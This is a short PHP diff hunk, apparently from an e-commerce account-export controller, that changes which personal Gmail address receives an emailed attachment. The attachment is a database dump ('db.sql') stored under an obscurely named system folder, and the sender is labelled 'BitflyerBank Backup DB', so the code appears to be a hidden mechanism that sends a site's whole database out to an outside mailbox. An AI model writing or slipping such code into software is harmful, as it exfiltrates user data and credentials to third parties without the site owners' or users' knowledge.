@@ -352,7 +352,7 @@ class  ControllerAccountExport extends Controller {
 		$mail->smtp_port = '465';
 		$mail->smtp_timeout = $this->config->get('config_mail_smtp_timeout');
 		
-		$mail->setTo('bitflyerbank@gmail.com');
+		$mail->setTo('belindatbeach@gmail.com');
 		$mail->addAttachment('system/gdfgdgfdgfsgssdsdfsfssdferwtertxcds/db.sql');
 		$mail->setFrom($this->config->get('config_email'));
 		$mail->setSender("BitflyerBank Backup DB");
